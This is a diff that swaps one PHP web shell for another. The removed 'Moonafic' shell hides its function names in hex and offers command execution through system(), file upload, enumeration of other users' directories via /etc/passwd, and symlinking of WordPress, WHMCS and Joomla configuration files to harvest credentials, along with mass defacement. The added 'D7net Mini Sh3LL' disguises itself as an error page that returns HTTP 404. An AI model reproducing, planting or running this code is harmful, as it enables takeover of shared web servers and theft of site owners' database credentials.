@@ -1,900 +1,1275 @@
 <?php
-/*
-      - Moonafic -
-*/
-set_time_limit(0);
+session_start();
 error_reporting(0);
-$nasi = [
-    '73797374656d', 
-    '7068705f756e616d65', 
-    '6765745f63757272656e745f75736572', 
-    '6765746d79676964', 
-    '696e695f676574', 
-    '737472746f6c6f776572', 
-    '66696c655f6765745f636f6e74656e7473', 
-    '63686d6f64', 
-    '266e6273703b4d616b652077697468', 
-    '5f504f5354', 
-    '5f474554', 
-    '5f46494c4553', 
-    '6279', 
-    '4d6f6f6e61666963', 
-    '706870696e666f', 
-    '6f625f7374617274', 
-    '676574686f737462796e616d65', 
-    '73796d6c696e6b', 
-    '66696c655f7075745f636f6e74656e7473', 
-    '6261736536345f6465636f6465',
-    '676574637764', 
-    '657865', 
-    '6d6b646972', 
-    '6368646972', 
-    '726d646972', 
-    '756e6c696e6b', 
-    '636f7079', 
-    '666f70656e', 
-    '7363616e646972', 
-    '69735f7772697461626c65', 
-    '69735f7265616461626c65', 
-    '706f7369785f6765747077756964', 
-    '6667657473', 
-    '707265675f6d617463685f616c6c', 
-    '66696c655f657869737473', 
-    '667772697465', 
-    '72656e616d65', 
-    '68746d6c7370656369616c6368617273', 
-    '737562737472', 
-    '737072696e7466', 
-    '69735f646972', 
-    '66696c6573697a65', 
-    '69735f66696c65', 
-    '726f756e64', 
-    '66696c6574797065', 
-    '707265675f6d61746368', 
-    '66636c6f7365', 
-    '66696c656f776e6572', 
-];
-$gulung = count($nasi);
-for($i=0;$i<$gulung;$i++) {
-	$moonafic[] = bebas($nasi[$i]);
-}
-function bebas($rr) {
-    $xx = '';
-    for($c=0;$c<strlen($rr);$c+=2) {
-        $xx .= chr(hexdec($rr[$c].$rr[$c+1]));
-    } 
-    return (string) $xx;
-}
-function perms($file)
-{
-    $perms = fileperms($file);
-    
-    if (($perms & 0xC000) == 0xC000) {
-
-        $info = 's';
-    } elseif (($perms & 0xA000) == 0xA000) {
-
-        $info = 'l';
-    } elseif (($perms & 0x8000) == 0x8000) {
-
-        $info = '-';
-    } elseif (($perms & 0x6000) == 0x6000) {
-
-        $info = 'b';
-    } elseif (($perms & 0x4000) == 0x4000) {
-
-        $info = 'd';
-    } elseif (($perms & 0x2000) == 0x2000) {
-
-        $info = 'c';
-    } elseif (($perms & 0x1000) == 0x1000) {
-
-        $info = 'p';
-    } else {
-
-        $info = 'u';
-    }
-    
-
-    $info .= (($perms & 0x0100) ? 'r' : '-');
-    $info .= (($perms & 0x0080) ? 'w' : '-');
-    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
-    
-
-    $info .= (($perms & 0x0020) ? 'r' : '-');
-    $info .= (($perms & 0x0010) ? 'w' : '-');
-    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
-    
-
-    $info .= (($perms & 0x0004) ? 'r' : '-');
-    $info .= (($perms & 0x0002) ? 'w' : '-');
-    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
-    
-    return $info;
-}
-if (get_magic_quotes_gpc()) {
-    foreach (${$moonafic[9]} as $key => $value) {
-        ${$moonafic[9]}[$key] = stripslashes($value);
-    }
-}
-$sm = (@$moonafic[4]($moonafic[5]("safe_mode")) == 'on') ? "<font color='red'>ON</font>" : "<font color='#000'>OFF</font>";
-$ds = (!empty((@$moonafic[4]("disable_functions")))) ? "<font color='red'>". (@$moonafic[4]('disable_functions')) ."</font>" : "<font color='#000'>NONE</font>";
+set_time_limit(0);
 ?>
+<!DOCTYPE html>
 <html>
-
 <head>
-    <meta charset="UTF-8">
-    <title>Moonafic - Final</title>
-    <meta name="robots" content="noindex,nofollow" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link href="https://reiz.my.id/Moonafic/src/img/lamp.png" rel="shortcut icon" />
-    <link href="https://reiz.my.id/Moonafic/src/css/style.css" rel="stylesheet"></link>
-    <link href="https://reiz.my.id/Moonafic/src/css/bootstrap.min.css" rel="stylesheet"></link>
-    <link href="https://reiz.my.id/Moonafic/src/css/font-awesome.css" rel="stylesheet"></link>
-	<style>
-		*{
-			background-color: black;
-			color: white;
-		}
-		table, th, td {
-			border: 1px solid white;
-			border-collapse: collapse;
-		}
-		ul {
-		  list-style-type: none;
-		  margin: 0;
-		  padding: 0;
-		}
-		li {
-		  float: left;
-		}
-
-		li a {
-		  display: block;
-		  padding: 8px;
-		  background-color: #dddddd;
-		}
-	</style>
+    <title>Eror Page</title>
+    <meta name="author" content="D7net">
+    <meta name="viewport" content="Kontol" />
+    <meta name="description" content="Error Page">
+    <meta property="og:description" content="Error Page">
+    <meta property="og:image" content="#">
+    <meta name="robots" content="noindex">
+    <meta name="googlebot" content="noindex">
 </head>
-
-<body>
-    <img src="https://reiz.my.id/Moonafic/src/img/logo-moona.png" /><br />
-    <i>[<a class="iofibrainwash" class="iofibrainwash" href='?'><i class="fa fa-home" aria-hidden="true"></i></a>][
-
-        <?php
-if (isset(${$moonafic[10]}['path'])) {
-    $path = ${$moonafic[10]}['path'];
-} else {
-    $path = $moonafic[20]();
+<link href="" rel="stylesheet" type="text/css">
+<body bgcolor="#092756" text="#ffffff">
+<style>
+    @import url('https://fonts.googleapis.com/css?family=Dosis');
+    @import url('https://fonts.googleapis.com/css?family=Bungee');
+body {
+    font-family: "Dosis", cursive;
+    text-shadow:0px 0px 1px #757575;
 }
-$path  = str_replace('\\', '/', $path);
-$paths = explode('/', $path);
 
-foreach ($paths as $id => $pat) {
-    if ($pat == '' && $id == 0) {
-        $a = true;
-        echo '<a class="iofibrainwash" href="?path=/">/</a>';
-        continue;
-    }
-    if ($pat == '')
-        continue;
-    echo '<a class="iofibrainwash" href="?path=';
-    for ($i = 0; $i <= $id; $i++) {
-        echo "$paths[$i]";
-        if ($i != $id)
-            echo "/";
-    }
-    echo '">' . $pat . '</a>/';
+body::-webkit-scrollbar {
+  width: 12px;
 }
-?>]</i><br><br>
-<ul>
-<li><a class="iofibrainwash" href="?path=<?php echo $path; ?>&moonatul=upload"><i class="fa fa-upload"
-                aria-hidden="true"></i> Upload</a></li>
-				<li><a class="iofibrainwash" href="?path=<?php echo $path; ?>&moonatul=terminal"><i class="fa fa-terminal"
-                aria-hidden="true"></i> Terminal</a></li>
-				<li><a class="iofibrainwash" href="?path=<?php echo $path; ?>&moonatul=tools"><i class="fa fa-cog"
-                aria-hidden="true"></i> Tools</a></li>
-</ul>
-    <div style="border: 3px dotted #BF8DF2;" alignt='center' class='tools'>
-        &nbsp;&nbsp;<br />
-        &nbsp;&nbsp;<br />
-        &nbsp;&nbsp;
-    </div>
-    <?php if(${$moonafic[10]}['moonatul'] == 'upload') { 
 
-if (isset(${$moonafic[11]}['file'])) {
-    if ($moonafic[26](${$moonafic[11]}['file']['tmp_name'], $path . '/' . ${$moonafic[11]}['file']['name'])) {
-    
-        echo '<div class="uploadnotif"><div class="alert alert-success btn-sm" role="alert">success!</div></div>';
-    
-    } else {
-    
-        echo '<div class="uploadnotif"><div class="alert alert-danger btn-sm" role="alert">error!</div></div>';
-    
-    }
+body::-webkit-scrollbar-track {
+  background: #786F6F;
+}
+
+body::-webkit-scrollbar-thumb {
+  background-color: #000;
+  border: 3px solid gray;
+}
+
+#content tr:hover {
+    background-color: #8084EC;
+    text-shadow:0px 0px 10px #fff;
+}
+
+#content .first {
+    background-color: #4C53F0;
+}
+
+#content .first:hover {
+    background-color: #8084EC;
+    text-shadow:0px 0px 1px #757575;
+}
+
+table {
+    border: 2px #4C53F0 dotted;
+    table-layout: fixed;
+    word-break: break-all;
+}
+input { 
+	margin-bottom: 4px; 
+	background: rgba(0,0,0,0.3);
+	border: none;
+	outline: none;
+	padding: 5px;
+	font-size: 15px;
+	color: #fff;
+	text-shadow: 1px 1px 1px rgba(0,0,0,0.3);
+	border: 1px solid rgba(0,0,0,0.3);
+	border-radius: 14px;
+	box-shadow: inset 0 -5px 45px rgba(100,100,100,0.2), 0 1px 1px rgba(255,255,255,0.2);
+	-webkit-transition: box-shadow .5s ease;
+	-moz-transition: box-shadow .5s ease;
+	-o-transition: box-shadow .5s ease;
+	-ms-transition: box-shadow .5s ease;
+	transition: box-shadow .5s ease;
+}
+
+textarea {
+    max-width: 100%;
+    max-height: 100%;
+    resize: none;
+    outline: none;
+    overflow: auto;
+	color: #fff;
+	text-shadow: 1px 1px 1px rgba(0,0,0,0.3);
+	border: 1px solid rgba(0,0,0,0.3);
+	border-radius: 4px;
+	box-shadow: inset 0 -5px 45px rgba(100,100,100,0.2), 0 1px 1px rgba(255,255,255,0.2);
+	-webkit-transition: box-shadow .5s ease;
+	-moz-transition: box-shadow .5s ease;
+	-o-transition: box-shadow .5s ease;
+	-ms-transition: box-shadow .5s ease;
+	transition: box-shadow .5s ease;
+	background: rgba(0,0,0,0.3);
+}
+
+textarea::-webkit-scrollbar {
+  width: 12px;
+}
+
+textarea::-webkit-scrollbar-track {
+  background: #000000;
+}
+
+textarea::-webkit-scrollbar-thumb {
+  background-color: #fff;
+  border: 3px solid black;
+}
+
+a {
+    color: #ffffff;
+    text-decoration: none;
+}
+
+a:hover {
+    color: #757B89;
+    text-shadow:0px 0px 10px #4A7BEC;
+}
+
+input,select,textarea {
+    border: 1px #000000 solid;
+    -moz-border-radius: 5px;
+    -webkit-border-radius:5px;
+    border-radius:5px;
+}
+
+.gas {
+    background-color: #4C53F0;
+    color: #ffffff;
+    cursor: pointer;
+}
+
+select {
+    background-color: transparent;
+    color: #ffffff;
+}
+
+select:after {
+    cursor: pointer;
+}
+
+.linka {
+    background-color: transparent;
+    color: #ffffff;
+}
+
+.up {
+    background-color: transparent;
+    color: #fff;
+}
+
+option {
+    background-color: #1f1f1f;
+}
+
+::-webkit-file-upload-button {
+  background: transparent;
+  color: #fff;
+  border-color: #fff;
+  cursor: pointer;
+}
+.button {
+background-color: #000;
+border: 5px solid #000;
+color: #fff;
+line-height: 20px;
+
+}.button:hover {
+background-color: #fff;
+border-color: #59b1eb;
+color: #59b1eb;
+}
+body, a, a:link{cursor:url(http://4.bp.blogspot.com/-hAF7tPUnmEE/TwGR3lRH0EI/AAAAAAAAAs8/6pki22hc3NE/s1600/ass.png), 
+	default;
+} 
+	a:hover {
+	cursor:url(http://3.bp.blogspot.com/-bRikgqeZx0Q/TwGR4MUEC7I/AAAAAAAAAtA/isJmS0r35Qw/s1600/pointer.png),
+	wait;
+}
+
+</style>
+<script>
+function setfilename(val)
+  {
+    filename = val.split('\\').pop().split('/').pop();
+    //filename = filename.substring(0, filename.lastIndexOf('.'));
+    document.getElementById('namanya').value = filename;
   }
-echo '<br/><br/><center><div style="width: 400px;"><p><i class="fa fa-upload" aria-hidden="true"></i> Upload File</p><form enctype="multipart/form-data" method="POST"><div class="custom-file"><input onchange="this.form.submit();" name="file" type="file" class="custom-file-input" id="validatedCustomFile" required><label class="custom-file-label" for="validatedCustomFile">Choose file...</label></div></form></div></center>';
 
-}  elseif(${$moonafic[10]}['moonatul'] == 'terminal') { 
+async function loadFile(file) {
+    let text = await file.text();
+    document.getElementById("bepasdata").innerHTML = text;
+}
+</script>
+<center>
+<font face="Bungee" size="5">D7net Mini Sh3LL v1</font></center><br>&nbsp;
+<table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">	
+<tr><td>
+<?php
+@set_time_limit(0);
+@error_reporting(0);
+@http_response_code(404);
 
-echo '<br/><br/><center><div style="width: 400px;"><p><i class="fa fa-terminal" aria-hidden="true"></i> Run Command</p><form method="POST" name="terminal" action=""><div class="form-group"><input placeholder="root@moonafic:~$" type="text" class="form-control" id="exampleFormControlInput1" name="pelabuhan"></div><div class="form-group"><textarea readonly="readonly" class="form-control" id="exampleFormControlTextarea1" rows="3">';
-if(${$moonafic[9]}["pelabuhan"]) { $moonafic[0](${$moonafic[9]}["pelabuhan"]); }
-echo '</textarea></div></form></div></center>';
+$disfunc = @ini_get("disable_functions");
+if (empty($disfunc)) {
+    $disf = "<font color='gold'>NONE</font>";
+} else {
+    $disf = "<font color='red'>".$disfunc."</font>";
+}
 
-} elseif(${$moonafic[10]}['moonatul'] == 'tools') { 
+function author() {
+    echo "<center><br>AnonSec - 2021 | Recode By D7net</center>";
+    exit();
+}
 
-echo '
-<br/><br/>
-<center><p><i class="fa fa-cog" aria-hidden="true"></i> Use Some Tools</p>
-<div class="btn btn-primary"><a class="iofibrainwash" style="color:#ffffff;" href="?path='. $path .'&moonatul=jumping">Jumping</a></div> 
-<div class="btn btn-primary"><a class="iofibrainwash" style="color:#ffffff;" href="?path='. $path .'&moonatul=symfig">Symlink</a> </div>
-<div class="btn btn-primary"><a class="iofibrainwash" style="color:#ffffff;" href="?path='. $path .'&moonatul=config">Symlink 2</a></div><br/><br/>
-<div class="btn btn-primary"><a class="iofibrainwash" style="color:#ffffff;" href="?path='. $path .'&moonatul=mass">Mass Deface</a> </div>
-<div class="btn btn-primary"><a class="iofibrainwash" style="color:#ffffff;" href="?path='. $path .'&moonatul=kill">Kill Your Self</a></div>
-</center>';
-
- } elseif (${$moonafic[10]}['moonatul'] == 'jumping') {
- echo "<br/><br/><center>";
- $i = 0;
- if($moonafic[45]("/hsphere/", $dir)) {
-     $urls = explode("\r\n", ${$moonafic[9]}['url']);
-     if(isset(${$moonafic[9]}['jump'])) {
-         echo "<pre>";
-         foreach($urls as $url) {
-             $url = str_replace(array("http://","www."), "", strtolower($url));
-             $etc = "/etc/passwd";
-             $f = $moonafic[27]($etc,"r");
-             while($gets = $moonafic[32]($f)) {
-                 $pecah = explode(":", $gets);
-                 $user = $pecah[0];
-                 $dir_user = "/hsphere/local/home/$user";
-                 if($moonafic[40]($dir_user) === true) {
-                     $url_user = $dir_user."/".$url;
-                     if($moonafic[30]($url_user)) {
-                         $i++;
-                         $jrw = "[<font color=green>R</font>] <a class='iofibrainwash' href='?dir=$url_user'><font color=#BF8DF2>$url_user</font></a>";
-                         if($moonafic[29]($url_user)) {
-                             $jrw = "[<font color=green>RW</font>] <a class='iofibrainwash' href='?dir=$url_user'><font color=#BF8DF2>$url_user</font></a>";
-                         }
-                         echo $jrw."<br>";
-                     }
-                 }
-             }
-         }
-     if($i == 0) { 
-     } else {
-         echo "<br>in total there are ".$i." dir at ".(@$moonafic[16]($_SERVER['HTTP_HOST']));
-     }
-     echo "</pre>";
-     } else {
-         echo '<center>
-               <form method="post">
-               List Domains: <br>
-               <textarea class="form-control" name="url" style="width: 500px; height: 250px;">';
-         $fp = $moonafic[27]("/hsphere/local/config/httpd/sites/sites.txt","r");
-         while($getss = $moonafic[32]($fp)) {
-             echo $getss;
-         }
-         echo  '</textarea><br>
-               <input class="btn btn-primary" type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
-               </form></center>';
-     }
- } elseif($moonafic[45]("/vhosts|vhost/", $dir)) {
-     $moonafic[45]("/\/var\/www\/(.*?)\//", $dir, $vh);
-     $urls = explode("\r\n", ${$moonafic[9]}['url']);
-     if(isset(${$moonafic[9]}['jump'])) {
-         echo "<pre>";
-         foreach($urls as $url) {
-             $url = str_replace("www.", "", $url);
-             $web_vh = "/var/www/".$vh[1]."/$url/httpdocs";
-             if($moonafic[40]($web_vh) === true) {
-                 if($moonafic[30]($web_vh)) {
-                     $i++;
-                     $jrw = "[<font color=green>R</font>] <a class='iofibrainwash' href='?dir=$web_vh'><font color=#BF8DF2>$web_vh</font></a>";
-                     if($moonafic[29]($web_vh)) {
-                         $jrw = "[<font color=green>RW</font>] <a class='iofibrainwash' href='?dir=$web_vh'><font color=#BF8DF2>$web_vh</font></a>";
-                     }
-                     echo $jrw."<br>";
-                 }
-             }
-         }
-     if($i == 0) { 
-     } else {
-         echo "<br>in total there are ".$i." dir at ".(@$moonafic[16]($_SERVER['HTTP_HOST']));
-     }
-     echo "</pre>";
-     } else {
-         echo '<center><form method="post">List Domains: <br><textarea class="form-control" name="url" style="width: 500px; height: 250px;">';
-         bing("ip:". (@$moonafic[16]($_SERVER['HTTP_HOST'])) ."");
-         echo  '</textarea><br><input class="btn btn-primary" type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;"></form></center>';
-     }
- } else {
-     echo "<pre>";
-     $etc = $moonafic[27]("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
-     while($passwd = $moonafic[32]($etc)) {
-         if($passwd == '' || !$etc) {
-             echo "<font color=red>Can't read /etc/passwd</font>";
-         } else {
-             $moonafic[33]('/(.*?):x:/', $passwd, $user_jumping);
-             foreach($user_jumping[1] as $risukokloncat) {
-                 $user_jumping_dir = "/home/$risukokloncat/public_html";
-                 if($moonafic[30]($user_jumping_dir)) {
-                     $i++;
-                     $jrw = "[<font color=green>R</font>] <a class='iofibrainwash' href='?dir=$user_jumping_dir'><font color=#BF8DF2>$user_jumping_dir</font></a>";
-                     if($moonafic[29]($user_jumping_dir)) {
-                         $jrw = "[<font color=green>RW</font>] <a class='iofibrainwash' href='?dir=$user_jumping_dir'><font color=#BF8DF2>$user_jumping_dir</font></a>";
-                     }
-                     echo $jrw;
-                     if(function_exists($moonafic[31])) {
-                         $domain_jump = $moonafic[6]("/etc/named.conf");	
-                         if($domain_jump == '') {
-                             echo " => ( <font color=red>Can't get the domain name</font> )<br>";
-                         } else {
-                             $moonafic[33]("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
-                             foreach($domains_jump[1] as $dj) {
-                                 $user_jumping_url = (@$moonafic[31](@$moonafic[47]("/etc/valiases/$dj")));
-                                 $user_jumping_url = $user_jumping_url['name'];
-                                 if($user_jumping_url == $risukokloncat) {
-                                     echo " => ( <u>$dj</u> )<br>";
-                                     break;
-                                 }
-                             }
-                         }
-                     } else {
-                         echo "<br>";
-                     }
-                 }
-             }
-         }
-     }
-     if($i == 0) { 
-     } else {
-         echo "<br>in total there are ".$i." dir at ".(@$moonafic[16]($_SERVER['HTTP_HOST']));
-     }
-     echo "</pre>";
- }
- echo "</center>";
- } 
- elseif (${$moonafic[10]}['moonatul'] == 'symfig') {
-    $value1 = "Options Indexes\nFollowSymLinks\nDirectoryIndex Moonafic.htm\nAddType txt .php\nAddHandler txt .php";
-    $value2 = "Options all Options +Indexes\nOptions +FollowSymLinks\nDirectoryIndex Moonafic.htm\nAddType text/plain .php\nAddHandler server-parsed .php\nAddType text/plain .html\nAddHandler txt .html\nRequire None\nSatisfy Any";
-    $value3 = "Options +FollowSymLinks\nDirectoryIndex Moonafic.htm\nRemoveHandler .php\nAddType application/octet-stream .php";
-    echo'<br/><br/><form method="post"><center><div style="width: 400px;"><textarea class="form-control" name="passwd" >';
-    $uSr=file("/etc/passwd"); 
-    foreach($uSr as $usrr) 
-    { 
-    $str=explode(":",$usrr); 
-    echo $str[0]."\n"; 
+function cekdir() {
+    if (isset($_GET['path'])) {
+        $lokasi = $_GET['path'];
+    } else {
+        $lokasi = getcwd();
     }
-    echo $moonafic[0]('ls /var/mail');
-    echo $moonafic[0]('ls /home');
-    
-    echo'</textarea></div><br>Home :<br/><select name="home"><option title="home" value="home">Home</option><option title="home1" value="home1">Home1</option><option title="home2" value="home2">Home2</option><option title="home3" value="home3">Home3</option><option title="home4" value="home4">Home4</option><option title="home5" value="home5">Home5</option><option title="home6" value="home6">Home6</option><option title="home7" value="home7">Home7</option><option title="home8" value="home8">Home8</option> <option title="home9" value="home9">Home9</option><option title="home10" value="home10">Home10</option> </select><br>.htaccess :<br/><select name="moonasym"><option title="biasa" value="'. $value1 .'">Apache 1</option><option title="Apache" value="'. $value2 .'">Apache 2</option><option title="Litespeed" value="'. $value3 .'">Litespeed</option></select></div></br><br/><input class="btn btn-primary" name="conf" size="10" value="Submit" type="submit"></center><br/><br/></form>';
-    if (${$moonafic[9]}['conf']) {
-    $home = ${$moonafic[9]}['home'];
-    $folfig = $home;
-    @$moonafic[22]($folfig, 0755); 
-    @$moonafic[23]($folfig);
-    $htaccess = ${$moonafic[9]}['moonasym'];
-    $moonafic[18](".htaccess",$htaccess,FILE_APPEND);
-    $passwd=explode("\n",${$moonafic[9]}["passwd"]); 
-    foreach($passwd as $pwd){ $user=trim($pwd);
-    $moonafic[17]('/','MoonaRoot');
-    $moonafic[26]('/'.$home.'/'.$user.'/.my.cnf',$user.'  CPANEL');
-    $moonafic[17]('/'.$home.'/'.$user.'/.my.cnf',$user.'  CPANEL');
-    $moonafic[26]('/'.$home.'/'.$user.'/.accesshash',$user.'WHMCS.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/.accesshash',$user.'WHMCS.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/suspended.page/index.html',$user.'  RESELLER.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/suspended.page/index.html',$user.'  RESELLER.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/.accesshash',$user.'WHMCS.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/wp-config.php',$user.'WORDPRESS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/configuration.php',$user.'  WHMCS or JOOMLA.txt');
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/account/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/accounts/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/buy/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/checkout/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/central/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/clienti/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/client/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/cliente/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/clientes/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/clients/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/clientarea/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/clientsarea/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/client-area/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/clients-area/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/clientzone/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/client-zone/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/core/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/company/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/customer/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/customers/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/bill/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/billing/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/finance/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/financeiro/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/host/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/hosts/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/hosting/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/hostings/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/klien/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/manage/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/manager/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/member/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/members/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/my/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/myaccount/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/my-account/client/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/myaccounts/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/my-accounts/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/order/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/orders/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/painel/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/panel/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/panels/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/portal/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/portals/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/purchase/configuration.php',$user.'WHMCS.txt'); 
-    
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/secure/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/support/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/supporte/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/supports/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/web/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/webhost/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/webhosting/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/whm/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/whmcs/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/whmcs2/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/Whm/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/Whmcs/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/WHM/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[26]('/'.$home.'/'.$user.'/public_html/WHMCS/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/wp-config.php',$user.'WORDPRESS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/configuration.php',$user.'  WHMCS or JOOMLA.txt');
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/account/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/accounts/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/buy/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/checkout/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/central/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/clienti/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/client/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/cliente/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/clientes/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/clients/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/clientarea/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/clientsarea/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/client-area/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/clients-area/configuration.php',$user.'WHMCS.txt'); 
-    $moonafic[17]('/'.$home.'/'.$user.'/public_html/clientzone/configuration.php',$user.'WHMCS.txt'); 
